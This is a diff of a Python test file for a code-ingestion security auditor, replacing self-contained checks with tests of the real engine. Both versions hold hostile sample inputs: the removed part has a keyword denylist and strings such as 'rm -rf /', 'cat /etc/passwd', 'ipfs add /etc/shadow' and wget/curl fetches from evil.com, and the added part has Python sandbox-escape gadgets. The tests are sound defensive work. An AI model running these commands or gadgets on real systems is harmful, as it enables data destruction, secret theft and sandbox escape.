@@ -1,205 +1,76 @@
-import pytest
-import os
+"""Security tests for the REAL engine.Crucible class.
+
+Previously this file re-implemented its own crucible_* helpers and never imported the
+engine, so it tested a fiction. It now exercises engine.Crucible directly — the actual
+security auditor used at ingestion — covering L1 integrity, L2 lineage, and the L4
+lysosome denylist (incl. the hardened escape-gadget detection and host-injected rules).
+"""
+import sys
+from pathlib import Path
+
+REPO_DIR = Path(__file__).resolve().parent.parent
+sys.path.insert(0, str(REPO_DIR / "hatchery"))
+
+import engine
 
 
-DANGEROUS_ENV_CHARS = [";", "|", "&", "`", "$", "\n"]
-DANGEROUS_INSTRUCTIONS = [
-    "rm -rf",
-    "os.system",
-    "eval(",
-    "exec(",
-    "chmod",
-    "chown",
-    "sudo ",
-    "PROGENITOR_LIFE_ID",
-    "crontab",
-    "wget ",
-    "curl ",
-    "ipfs add",
-    "ipfs pin",
-]
-
-
-def crucible_validate_env(value):
-    if not value:
-        return False, "空值拒止"
-    for char in DANGEROUS_ENV_CHARS:
-        if char in value:
-            return False, f"检测到危险字符: {repr(char)}"
-    return True, None
-
-
-def crucible_validate_agent_name(name):
-    if not name:
-        return False, "Agent 名称为空"
-    for char in DANGEROUS_ENV_CHARS:
-        if char in name:
-            return False, f"Agent 名称包含危险字符: {repr(char)}"
-    return True, None
-
-
-def crucible_detect_dangerous_instructions(content):
-    findings = []
-    for line_no, line in enumerate(content.split("\n"), 1):
-        for keyword in DANGEROUS_INSTRUCTIONS:
-            if keyword in line and not line.strip().startswith("#"):
-                findings.append({
-                    "line": line_no,
-                    "keyword": keyword
-                })
-    return findings
-
-
-def crucible_full_audit(env_vars, gene_content):
-    results = {
-        "passed": True,
-        "checks": []
+def _complete_metadata():
+    return {
+        "life_crest": {"life_id": "PGN@L1-G1-TEST"},
+        "genealogy_codex": {"current_genealogy": "L1-G1-TEST"},
+        "skill_soul": {},
+        "primordial_endosperm": {},
     }
 
-    for var_name, var_value in env_vars.items():
-        passed, reason = crucible_validate_env(var_value)
-        results["checks"].append({
-            "type": "env_var",
-            "name": var_name,
-            "passed": passed,
-            "reason": reason
-        })
-        if not passed:
-            results["passed"] = False
 
-    findings = crucible_detect_dangerous_instructions(gene_content)
-    results["checks"].append({
-        "type": "dangerous_instructions",
-        "passed": len(findings) == 0,
-        "findings": findings
-    })
-    if findings:
-        results["passed"] = False
+class TestCrucibleLayer1Integrity:
+    def test_complete_metadata_passes(self):
+        assert engine.Crucible()._layer1_integrity(_complete_metadata())["passed"] is True
 
-    return results
-
-
-class TestCrucibleEnvValidation:
-    def test_valid_simple_value(self):
-        passed, reason = crucible_validate_env("hello")
-        assert passed is True
-        assert reason is None
-
-    def test_valid_uuid(self):
-        passed, reason = crucible_validate_env("PGN@L1-G0-DEVELOPER")
-        assert passed is True
-
-    def test_empty_value(self):
-        passed, reason = crucible_validate_env("")
-        assert passed is False
-        assert "空" in reason
-
-    def test_semicolon_injection(self):
-        passed, reason = crucible_validate_env("hello; rm -rf /")
-        assert passed is False
-        assert ";" in reason
-
-    def test_pipe_injection(self):
-        passed, reason = crucible_validate_env("hello|cat /etc/passwd")
-        assert passed is False
-
-    def test_backtick_injection(self):
-        passed, reason = crucible_validate_env("hello`whoami`")
-        assert passed is False
-
-    def test_dollar_injection(self):
-        passed, reason = crucible_validate_env("$PATH")
-        assert passed is False
-
-    def test_newline_injection(self):
-        passed, reason = crucible_validate_env("hello\nrm -rf /")
-        assert passed is False
-
-
-class TestCrucibleDangerousInstructions:
-    def test_clean_content(self):
-        content = "# PGN@L1-G99-TEST\ndef main():\n    return {'status': 'ok'}\n"
-        findings = crucible_detect_dangerous_instructions(content)
-        assert len(findings) == 0
-
-    def test_detect_rm_rf(self):
-        content = "# bad gene\ndef main():\n    rm -rf /tmp/test\n"
-        findings = crucible_detect_dangerous_instructions(content)
-        assert len(findings) > 0
-        assert any("rm -rf" in f["keyword"] for f in findings)
-
-    def test_detect_os_system(self):
-        content = "import os\nos.system('ls')\n"
-        findings = crucible_detect_dangerous_instructions(content)
-        assert len(findings) > 0
-
-    def test_detect_eval(self):
-        content = "eval('1+1')\n"
-        findings = crucible_detect_dangerous_instructions(content)
-        assert len(findings) > 0
-
-    def test_detect_exec(self):
-        content = "exec('print(1)')\n"
-        findings = crucible_detect_dangerous_instructions(content)
-        assert len(findings) > 0
-
-    def test_detect_ipfs_commands(self):
-        content = "ipfs add /etc/shadow\n"
-        findings = crucible_detect_dangerous_instructions(content)
-        assert any("ipfs" in f["keyword"] for f in findings)
-
-    def test_commented_lines_ignored(self):
-        content = "# this uses rm -rf\n# and os.system\n\ndef main():\n    return {}\n"
-        findings = crucible_detect_dangerous_instructions(content)
-        assert len(findings) == 0
-
-    def test_detect_sudo(self):
-        content = "sudo rm -rf /\n"
-        findings = crucible_detect_dangerous_instructions(content)
-        assert any("sudo" in f["keyword"] for f in findings)
-
-    def test_detect_wget_curl(self):
-        content = "wget http://evil.com/payload.sh\ncurl http://evil.com/backdoor\n"
-        findings = crucible_detect_dangerous_instructions(content)
-        assert any("wget" in f["keyword"] for f in findings)
-        assert any("curl" in f["keyword"] for f in findings)
-
-
-class TestCrucibleFullAudit:
-    def test_all_clean(self):
-        env = {
-            "PROGENITOR_LIFE_ID": "PGN@L1-G0-DEV",
-            "PROGENITOR_AGENT_NAME": "test-agent"
-        }
-        content = "# PGN@L1-G99-TEST\ndef main():\n    return {}\n"
-        result = crucible_full_audit(env, content)
-        assert result["passed"] is True
-
-    def test_env_injection_fails_audit(self):
-        env = {
-            "PROGENITOR_LIFE_ID": "PGN@L1-G0-DEV; rm -rf /",
-            "PROGENITOR_AGENT_NAME": "test-agent"
-        }
-        content = "def main():\n    return {}\n"
-        result = crucible_full_audit(env, content)
+    def test_missing_field_fails(self):
+        meta = _complete_metadata()
+        del meta["skill_soul"]
+        result = engine.Crucible()._layer1_integrity(meta)
         assert result["passed"] is False
+        assert "skill_soul" in result["reason"]
 
-    def test_dangerous_code_fails_audit(self):
-        env = {
-            "PROGENITOR_LIFE_ID": "PGN@L1-G0-DEV",
-            "PROGENITOR_AGENT_NAME": "test-agent"
-        }
-        content = "import os\nos.system('cat /etc/passwd')\n"
-        result = crucible_full_audit(env, content)
-        assert result["passed"] is False
 
-    def test_multiple_failures(self):
-        env = {
-            "PROGENITOR_LIFE_ID": "bad;value",
-            "PROGENITOR_AGENT_NAME": "bad|name"
-        }
-        content = "eval('1')\nexec('2')\n"
-        result = crucible_full_audit(env, content)
-        assert result["passed"] is False
-        failed_checks = [c for c in result["checks"] if not c["passed"]]
-        assert len(failed_checks) >= 3
+class TestCrucibleLayer2Lineage:
+    def test_genealogy_present_passes(self):
+        assert engine.Crucible()._layer2_lineage(_complete_metadata())["passed"] is True
+
+    def test_missing_genealogy_fails(self):
+        assert engine.Crucible()._layer2_lineage({"genealogy_codex": {}})["passed"] is False
+
+
+class TestCrucibleLayer4Lysosome:
+    def test_benign_code_passes(self):
+        assert engine.Crucible()._layer4_lysosome("def main():\n    return sum(range(10))\n")["passed"] is True
+
+    def test_os_system_blocked(self):
+        assert engine.Crucible()._layer4_lysosome("import os\nos.system('id')\n")["passed"] is False
+
+    def test_eval_blocked(self):
+        assert engine.Crucible()._layer4_lysosome("x = eval('1+1')\n")["passed"] is False
+
+    def test_subprocess_blocked(self):
+        assert engine.Crucible()._layer4_lysosome("import subprocess\nsubprocess.run(['ls'])\n")["passed"] is False
+
+    def test_obfuscated_getattr_blocked(self):
+        # hardened: split-string getattr must not slip past the denylist
+        assert engine.Crucible()._layer4_lysosome("import os\ngetattr(os, 'sys' + 'tem')('id')\n")["passed"] is False
+
+    def test_subclasses_walk_blocked(self):
+        assert engine.Crucible()._layer4_lysosome("().__class__.__base__.__subclasses__()\n")["passed"] is False
+
+    def test_builtins_subscript_blocked(self):
+        assert engine.Crucible()._layer4_lysosome("__builtins__['eval']('1')\n")["passed"] is False
+
+    def test_syntax_error_rejected(self):
+        assert engine.Crucible()._layer4_lysosome("def main(:\n    pass\n")["passed"] is False
+
+    def test_host_injected_blacklist(self):
+        # a host can extend the denylist via host_rules; a plain Crucible should not block it
+        hardened = engine.Crucible(host_rules={"additional_blacklist": ["my_risky_call"]})
+        assert hardened._layer4_lysosome("my_risky_call()\n")["passed"] is False
+        assert engine.Crucible()._layer4_lysosome("my_risky_call()\n")["passed"] is True
